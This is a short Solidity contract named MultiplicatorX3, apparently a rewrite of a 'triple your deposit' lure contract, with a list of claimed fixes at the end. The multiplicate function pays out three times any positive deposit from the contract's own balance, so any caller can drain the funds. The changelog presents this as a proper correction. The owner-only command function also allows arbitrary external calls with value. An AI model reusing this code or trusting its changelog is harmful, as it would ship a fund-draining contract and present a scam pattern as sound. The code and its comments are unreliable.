pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }

    function multiplicate(address _adr) public payable {
        require(msg.value > 0);
        _adr.transfer(msg.value * 3);
    }
} 

//Changes made:
//Changed Owner variable to owner with lowercase letters for consistency
//Removed unnecessary "payable" keyword from withdraw function
//Added require statement to check the return value of external call in Command function
//Added require statement to check that msg.value is greater than 0 in multiplicate function
//Changed the transfer amount in multiplicate function to msg.value * 3 to properly multiply the value sent to the function